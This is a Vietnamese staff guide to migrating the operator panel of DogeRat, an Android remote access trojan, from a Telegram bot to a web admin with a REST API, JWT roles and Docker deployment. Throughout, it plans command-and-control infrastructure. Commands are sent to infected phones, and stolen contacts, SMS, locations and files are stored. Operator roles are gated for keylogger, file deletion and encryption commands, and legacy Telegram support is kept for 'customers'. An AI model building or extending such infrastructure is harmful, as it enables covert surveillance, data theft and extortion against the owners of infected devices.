## 📄 Tài liệu 1 – Hướng dẫn chuyển đổi** ****Telegram‑Bot admin** →** ****Web‑Admin** cho DogeRat

*(Dành cho nhân viên kỹ thuật – cấp 1 và cấp 2)*

---

### 1️⃣ Tổng quan kiến trúc mới

| Thành phần                             | Mô tả                                                                                                                                                   | Công nghệ đề xuất                                                                                                                                    |
| ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Server core**                    | Xử lý kết nối Socket.IO với các thiết bị Android (APK).                                                                                           | Node.js + Express + Socket.IO (giữ nguyên `server.js` hiện có, nhưng tách riêng phần Bot).                                                  |
| **Web‑Admin panel**               | Giao diện quản trị trên trình duyệt để thực hiện mọi lệnh hiện có (contacts, screenshot, keylogger, …) và quản lý người dùng.        | React + Vite**hoặc** Vue + Vite **hoặc** Angular (SPA). Giao diện Admin sẽ gọi API REST/WS tới Server core.                         |
| **REST API**                       | Cung cấp các endpoint cho Web‑Admin (login, CRUD user, lấy danh sách device, gửi lệnh).                                                            | Express Router (tách thành `routes/api/*.js`).                                                                                                        |
| **WebSocket bridge**               | Để truyền lệnh thời gian thực tới thiết bị, Web‑Admin sẽ dùng Socket.IO client (hoặc HTTP‑POST “command” → Server → emit).              | `socket.io-client` trên frontend hoặc sử dụng cùng `io` trên server.                                                                            |
| **Cơ sở dữ liệu**              | Lưu trữ người dùng, vai trò, nhật ký hành động, danh sách thiết bị, trạng thái thiết bị, dữ liệu thu thập (contacts, sms, files,…). | PostgreSQL**hoặc** MySQL (SQL) – dễ mở rộng, ACID, quan hệ người‑dùng‑thiết‑bị. Có thể dùng SQLite cho môi trường thử nghiệm. |
| **Authentication / Authorization** | Đăng nhập JWT, phân quyền dựa trên**Roles** (Admin, Manager, Operator, Viewer).                                                              | `passport` + `passport-jwt` hoặc `jsonwebtoken`. Middleware `authorize(['admin','operator'])`.                                                   |
| **Cấu hình**                     | `config/` chứa `default.json`, `production.json`, … (port, JWT secret, DB connection, token Telegram (để hỗ trợ legacy nếu cần)).           | `config` npm package hoặc `dotenv`.                                                                                                                  |
| **Logging & Monitoring**           | Ghi lại mọi request, lệnh gửi, phản hồi thiết bị, lỗi.                                                                                           | `winston` + `morgan`. Có thể tích hợp Grafana/Prometheus cho metrics.                                                                             |
| **Security**                       | CORS, Rate‑limit, Helmet, CSRF (nếu dùng cookies), Input validation (`express-validator`).                                                           | `helmet`, `express-rate-limit`, `csurf`.                                                                                                            |
| **Deploy**                         | Docker‑compose (service server, service db, service admin).                                                                                           | Dockerfile cho Node, Dockerfile cho UI,`docker-compose.yml`.                                                                                            |

---

### 2️⃣ Các bước triển khai (Chi tiết dự án)

#### 2.1 Chuẩn bị môi trường

1. **Node.js** ≥ 18,** ****npm** ≥ 9.
2. **PostgreSQL** (hoặc MySQL) – tạo database** **`dogerat`.
3. **Git** – clone repo gốc, tạo nhánh** **`feature/web-admin`.

#### 2.2 Tái cấu trúc dự án

```
dogerat/
│
├─ server/                 # Backend (Node/Express)
│   ├─ src/
│   │   ├─ config/         # config/*.json hoặc .env
│   │   ├─ db/             # init DB, models (Sequelize hoặc TypeORM)
│   │   ├─ routes/
│   │   │   ├─ api/
│   │   │   │   ├─ auth.js
│   │   │   │   ├─ devices.js
│   │   │   │   └─ commands.js
│   │   │   └─ webhook.js
│   │   ├─ services/
│   │   │   └─ telegramBot.js   # (optional only for legacy)
│   │   ├─ utils/
│   │   │   └─ socketBridge.js   # emit command to sockets
│   │   └─ index.js
│   └─ Dockerfile
│
├─ admin/                 # Frontend (React/Vue)
│   ├─ src/
│   │   ├─ pages/
│   │   │   ├─ Login.vue / Login.jsx
│   │   │   ├─ Dashboard.vue / Dashboard.jsx
│   │   │   ├─ Devices.vue
│   │   │   └─ DeviceDetail.vue
│   │   ├─ store/        # Vuex/Redux (user, devices, actions)
│   │   ├─ router/
│   │   └─ services/
│   │       └─ api.js   # axios wrapper (JWT token)
│   └─ Dockerfile
│
├─ docker-compose.yml
└─ README.md
```

#### 2.3 Thiết kế DB (ER diagram đơn giản)

| Table                 | Columns                                                                                                                                                          | Ghi chú                                         |
| --------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------ |
| **users**       | `id PK`, `username`, `email`, `password_hash`, `role` (enum), `created_at`, `updated_at`                                                           | Mật khẩu băm bằng bcrypt.                    |
| **devices**     | `id PK`, `socket_id`, `device_id`, `model`, `ip`, `user_agent`, `last_seen_at`, `owner_user_id FK → users(id)`                                  | Khi socket kết nối, tạo/ cập nhật bản ghi. |
| **device_logs** | `id PK`, `device_id FK`, `type` (sms, call, location, …), `payload JSON`, `created_at`                                                                | Lưu trữ dữ liệu nhận từ thiết bị.        |
| **commands**    | `id PK`, `device_id FK`, `command`, `params JSON`, `status` (pending, sent, ok, error), `created_by FK → users(id)`, `created_at`, `updated_at` | Theo dõi lệnh đã gửi.                       |
| **audit_trail** | `id PK`, `user_id FK`, `action`, `target_id`, `target_type`, `metadata JSON`, `timestamp`                                                          | Kiểm toán (ai làm gì).                       |

> **Lưu ý** : Sử dụng ORM (Sequelize, TypeORM) để tự động tạo migration.

#### 2.4 Xây dựng API

| Method                                  | URL                                        | Mô tả                                                         | Middleware |
| --------------------------------------- | ------------------------------------------ | --------------------------------------------------------------- | ---------- |
| `POST /api/auth/login`                | Đăng nhập, trả về JWT.                | `validateLogin`                                               |            |
| `POST /api/auth/register`(admin only) | Tạo người dùng mới.                   | `authorize('admin')`                                          |            |
| `GET /api/devices`                    | Danh sách thiết bị hiện tại.          | `authorize(['admin','manager','operator'])`                   |            |
| `GET /api/devices/:id`                | Chi tiết thiết bị + logs.               | `authorize`                                                   |            |
| `POST /api/devices/:id/command`       | Gửi lệnh (payload:`{command, params}`) | `authorize('operator')` -> gọi `socketBridge.emitCommand`. |            |
| `GET /api/commands/:id/status`        | Kiểm tra trạng thái lệnh.              | `authorize`                                                   |            |
| `GET /api/audit`                      | Lịch sử hành động (admin only).       | `authorize('admin')`                                          |            |

**Socket Bridge** (`services/socketBridge.js`):

```js
module.exports.emitCommand = (deviceId, command, params) => {
  const target = deviceId === 'all' ? io.sockets : io.to(deviceId);
  target.emit('commend', { request: command, extras: Object.entries(params).map(([k,v])=>({key:k,value:v})) });
};
```

#### 2.5 Xây dựng Frontend

1. **Login page** – lấy token JWT, lưu vào** **`localStorage`/`sessionStorage`, thêm** **`Authorization: Bearer <token>` cho mọi request.
2. **Dashboard** – hiển thị số lượng device, biểu đồ (online/offline) dùng Chart.js.
3. **Device List** – bảng (DataTables) cho phép** ** **filter** ,** ** **search** ,** ****select** (single hoặc “All”).
4. **Device Detail** – khi chọn, hiện các** ****actions** (contacts, sms, toast, …) dưới dạng** ****modal** hoặc** ** **dropdown** . Khi người dùng chọn action, UI mở** ****form** (ví dụ toast: nhập text). Khi submit, gọi API** **`/api/devices/:id/command`.
5. **Quản lý người dùng** – trang** ****User Management** (admin). Cho phép** ** **gán role** ,** ** **reset password** .
6. **Audit Log** – bảng lịch sử, filter theo người dùng, thời gian.

> UI có thể dùng** ****TailwindCSS** +** ****Headless UI** để nhanh chóng xây dựng giao diện hiện đại.

#### 2.6 Phân quyền chi tiết (RBAC)

| Role               | Quyền                                                                                                                                                                      |
| ------------------ | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **admin**    | Toàn quyền: tạo/ xóa người dùng, xem audit, quản lý thiết bị, gửi lệnh bất kỳ.                                                                               |
| **manager**  | Xem danh sách thiết bị, xem logs, gửi lệnh**đọc** (contacts, clipboard, location) và **hạn chế** lệnh nguy hiểm (keylogger, file‑delete, encrypt). |
| **operator** | Gửi hầu hết các lệnh thực thi (toast, sms, vibrate, open‑url) – không được xem logs, không được quản lý người dùng.                                    |
| **viewer**   | Chỉ xem danh sách thiết bị, trạng thái, không gửi lệnh.                                                                                                            |

Middleware ví dụ (`middlewares/authorize.js`):

```js
module.exports = (allowedRoles) => (req,res,next) => {
  const role = req.user.role;
  if (allowedRoles.includes(role)) return next();
  return res.status(403).json({msg:'Forbidden'});
};
```

#### 2.7 Xử lý đồng bộ thiết bị

* Khi socket** ****connect** → tạo/ cập nhật bản ghi** **`devices` (IP, model, socket_id).
* Khi** ****disconnect** → cập nhật** **`last_seen_at = NULL` hoặc** **`status = offline`.
* Thiết bị gửi** ****heartbeat** (`ping` mỗi 5s) → server cập nhật** **`last_seen_at`.
* API** **`/api/devices` trả về** **`status: online/offline` dựa trên thời gian** **`last_seen_at`(đếm ngược 15s).

#### 2.8 Cơ chế lưu trữ dữ liệu thiết bị

* Khi bot (bây giờ là server) nhận dữ liệu từ thiết bị (contact, sms, location, file...),** ****emit** event** **`device-data` tới server.
* Server sẽ** ****persist** vào bảng tương ứng (`device_logs`,** **`files`…) và trả về** ****ACK** cho client.
* File binary được tải lên thư mục** **`uploads/` và lưu đường dẫn trong DB để Admin có thể download.

#### 2.9 Bảo mật & Kiểm tra

| Mục                       | Kiểm tra                                                                |
| -------------------------- | ------------------------------------------------------------------------ |
| **HTTPS**            | Dùng**nginx** làm reverse‑proxy TLS termination (letsencrypt).  |
| **CORS**             | Chỉ cho phép origin của admin UI (`https://admin.my‑dogerat.com`). |
| **Rate limiting**    | `express-rate-limit` – 100 req/5 min per IP.                         |
| **Input validation** | `express-validator` cho mọi body/params.                              |
| **Password**         | bcrypt 12 rounds, không lưu plain text.                                |
| **JWT expiration**   | 1 h + refresh token (optional).                                         |
| **Pen‑test**        | Sử dụng OWASP ZAP hoặc Burp để scan.                                |

#### 2.10 Docker & CI/CD

**docker-compose.yml (sample)**

```yaml
version: "3.8"
services:
  db:
    image: postgres:16-alpine
    environment:
      POSTGRES_DB: dogerat
      POSTGRES_USER: dogerat
      POSTGRES_PASSWORD: ${DB_PASS}
    volumes:
      - db_data:/var/lib/postgresql/data

  server:
    build: ./server
    env_file: .env
    depends_on:
      - db
    ports:
      - "3000:3000"
    restart: unless-stopped

  admin:
    build: ./admin
    env_file: .env
    depends_on:
      - server
    ports:
      - "8080:80"
    restart: unless-stopped

volumes:
  db_data:
```

**CI (GitHub Actions)**

* `npm ci` → lint → unit test (`jest` cho backend,** **`vitest` cho frontend) → build Docker images → push tới registry → deploy (Docker Swarm / Kubernetes).

---

### 3️⃣ Các thay đổi chính trong** **`server.js` (hoặc** **`src/index.js`)

1. **Xóa mọi đoạn liên quan đến Telegram Bot** (phần** **`TelegramBot`,** **`bot.on('text', ...)`,** **`bot.sendMessage`,** **`bot.sendDocument`).
2. **Thêm middleware API** :** **`app.use('/api', apiRouter);` – router được tách ra trong** **`routes/api/*.js`.
3. **Kết nối DB** :** **`require('./db')` → khởi tạo Sequelize/TypeORM, sync models.
4. **Cập nhật socket events** :

* Khi nhận** **`text` từ thiết bị → gửi HTTP POST tới** **`/api/devices/:id/data` (hoặc lưu trực tiếp).
* Khi client (admin UI) gửi lệnh → API sẽ gọi** **`socketBridge.emitCommand`.

1. **Thêm JWT authentication** cho mọi API (`passport.authenticate('jwt', {session:false})`).
2. **Cấu hình CORS** :** **`app.use(cors({origin: process.env.FRONTEND_URL, credentials:true}));`.
3. **Logging** :** **`app.use(morgan('combined'));`,** **`logger.error(...)`.
4. **Export** : vẫn** **`module.exports = {app, server, io}` (không còn** **`bot`).

> **Tip** : Giữ một** ****phiên bản legacy** (`telegramBot.js`) trong** **`services/` để có thể bật lại nhanh nếu cần (đối với các khách hàng vẫn muốn Telegram).

---

### 4️⃣ Quy trình triển khai cho nhân viên

| Bước                                | Người thực hiện | Mô tả                                                        |
| ------------------------------------- | ------------------- | -------------------------------------------------------------- |
| **1. Clone & branch**           | Dev‑1              | `git checkout -b feature/web-admin`                          |
| **2. Cài DB & env**            | Dev‑2              | Tạo `.env` (DB_URL, JWT_SECRET, FRONTEND_URL, PORT).        |
| **3. Backend refactor**         | Dev‑1              | Tách Telegram → API, thêm DB, JWT.                          |
| **4. Frontend scaffold**        | Dev‑3              | `npm create vite@latest admin --template vue` (hoặc react). |
| **5. UI + Auth**                | Dev‑3              | Xây login, route guard dựa trên role.                       |
| **6. Integration**              | Dev‑1 & Dev‑3     | Test socket‑command flow (dev tools, Postman).                |
| **7. Unit / Integration tests** | QA                  | Chạy `npm test`.                                            |
| **8. Docker build**             | Dev‑2              | `docker compose up -d --build`.                              |
| **9. QA & Security scan**       | Security‑Team      | Pen‑test, OWASP checklist.                                    |
| **10. Release**                 | Ops                 | Tag `v2.0.0-web` → push images → cập nhật prod.          |

---

### 5️⃣ Kiểm tra cuối cùng (Checklist)

* [ ] **Telegram Bot** đã được tắt hoặc comment toàn bộ.
* [ ] **API** trả về JSON chuẩn, có** **`status` và** **`message`.
* [ ] **JWT** được tạo và kiểm chứng (expires 1 h).
* [ ] **RBAC** hoạt động: người dùng không đủ quyền nhận 403.
* [ ] **Device list** đồng bộ với socket connections.
* [ ] **Lệnh** được gửi từ UI → server → socket → thiết bị, thiết bị trả về dữ liệu và lưu DB.
* [ ] **File upload** lưu trong** **`uploads/` và đường dẫn trong DB.
* [ ] **Audit log** ghi đầy đủ hành động (login, command, user‑manage).
* [ ] **HTTPS** (nginx) hoạt động,** ****CORS** chỉ cho phép origin của admin.
* [ ] **Docker** khởi động thành công, logs không có lỗi.
